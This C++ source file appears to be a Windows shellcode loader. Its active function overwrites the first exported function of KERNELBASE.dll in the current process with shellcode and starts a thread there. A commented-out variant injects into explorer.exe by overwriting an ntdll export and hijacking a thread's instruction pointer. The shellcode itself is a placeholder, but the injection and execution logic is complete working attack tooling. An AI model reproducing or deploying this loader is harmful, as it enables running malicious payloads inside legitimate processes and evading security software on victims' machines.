#include "pch.h"
#include "Utils.h"

#include <stdio.h>

extern "C" PVOID getLib(void);

NTSTATUS execute(void) { // local thread exec
	// Arguments - Variable
	const WCHAR* pDllname = L"KERNELBASE.dll";
	unsigned char shellcode[] =
		"Add your shellcode here";

	PVOID dllBase = getLib();

	// find the first exported function
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)dllBase;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBase + pIDH->e_lfanew);
	DWORD iedAddr = pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	
	if (iedAddr) {
		PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + iedAddr);
		
		LPDWORD addresses = (LPDWORD)((DWORD_PTR)dllBase + pIED->AddressOfFunctions);
		LPWORD ordinals = (LPWORD)((DWORD_PTR)dllBase + pIED->AddressOfNameOrdinals);

		// Select the first entry
		LPVOID targetAddr = (LPVOID)((DWORD_PTR)dllBase + addresses[ordinals[0]]);

		// Writing shellcode to the target address (target function overwrite)
		HANDLE hProc = GetCurrentProcess();

		SIZE_T pBytes;

		if (WriteProcessMemory(hProc, targetAddr, shellcode, sizeof(shellcode), &pBytes)) {
			// Trigger the shellcode 
			if (!CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)targetAddr, NULL, 0, 0)) {
				return 1;
			}
			else 
				return STATUS_SUCCESS;
		}

	}

	return 1;
}

/*
DWORD getPid(const WCHAR* filename) {
	DWORD dwPid = 0;

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snap, &entry)) {
		while (Process32Next(snap, &entry)) {
			if (!wcscmp(entry.szExeFile, filename)) {
				return entry.th32ProcessID;
			}
		}
	}

	return dwPid;
}

NTSTATUS execute(void) { // Thread hijacking 

	// Arguments - Variable
	const WCHAR* pProcessname = L"explorer.exe";
	const WCHAR* pDllname = L"ntdll.dll";
	unsigned char shellcode[] =
		"Add you shellcode here";
	DWORD dwPid = getPid(pProcessname);

	if (dwPid) {
		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);
		HMODULE hMod = NULL;

		if (hSnap && hSnap != INVALID_HANDLE_VALUE) {
			MODULEENTRY32 currMod = { 0 };
			currMod.dwSize = sizeof(MODULEENTRY32);

			if (Module32First(hSnap, &currMod)) {
				do {
					if (!wcscmp(currMod.szModule, pDllname)) {
						printf("# Module found: %S\n", currMod.szExePath);

						// find the first exported function
						PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)currMod.hModule;
						PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD_PTR)currMod.hModule + pIDH->e_lfanew);
						DWORD iedAddr = pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
						if (iedAddr) {
							PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)currMod.hModule + iedAddr);
							printf("# IMAGE EXPORT DIRECTORY adress: 0x%p\n", pIED);

							LPDWORD addresses = (LPDWORD)((DWORD_PTR)currMod.hModule + pIED->AddressOfFunctions);
							LPDWORD names = (LPDWORD)((DWORD_PTR)currMod.hModule + pIED->AddressOfNames);
							LPWORD ordinals = (LPWORD)((DWORD_PTR)currMod.hModule + pIED->AddressOfNameOrdinals);

							// Select the first entry
							LPWSTR targetName = (LPWSTR)((DWORD_PTR)currMod.hModule + names[0]);
							LPVOID targetAddr = (LPVOID)((DWORD_PTR)currMod.hModule + addresses[ordinals[0]]);

							printf("# Targetting: %s - 0x%p\n", targetName, targetAddr);

							// Writing shellcode to the target address (target function overwrite)
							HANDLE hProc = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPid);

							SIZE_T pBytes;
							
							if (WriteProcessMemory(hProc, targetAddr, shellcode, sizeof(shellcode), &pBytes)) {
								printf("Bytes successfully written in memory: %d\n", pBytes);

								// Trigger the shellcode 
								HANDLE tSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPid);
								THREADENTRY32 tEntry = { sizeof(THREADENTRY32) };
								HANDLE hThread = NULL;
								CONTEXT context;
								context.ContextFlags = CONTEXT_FULL;
								tEntry.dwSize = sizeof(THREADENTRY32);

								tSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPid);

								Thread32First(tSnap, &tEntry);

								while (Thread32Next(tSnap, &tEntry)) {
									if (tEntry.th32OwnerProcessID == dwPid) {
										hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tEntry.th32ThreadID);
										if (hThread) {
											printf("Hijacking Thread: %d\n", tEntry.th32ThreadID);
											break;
										}
									}
								}

								if (hThread) {
									SuspendThread(hThread);

									GetThreadContext(hThread, &context);
									context.Rip = (DWORD_PTR)targetAddr;
									SetThreadContext(hThread, &context);
									ResumeThread(hThread);
									return STATUS_SUCCESS;
								}
								else
								{
									printf("** Error opening thread handle **\n");
								}
							}
							else {
								printf("** Error writing to target process memory **\n");
							}
							
						}
						else {
							printf("** IMAGE_DIRECTORY_ENTRY_EXPORT virtual address is 0. **\n");
						}
					}
				} while (Module32Next(hSnap, &currMod));
			}
			else {
				printf("** Failed to recover modules **\n");
			}

			CloseHandle(hSnap);
		}
		else {
			printf("** Failed snap **\n");
		}
	}
	else {
		printf("Process not found!\n");
		return STATUS_INVALID_HANDLE;
	}

	return STATUS_SUCCESS;
}
*/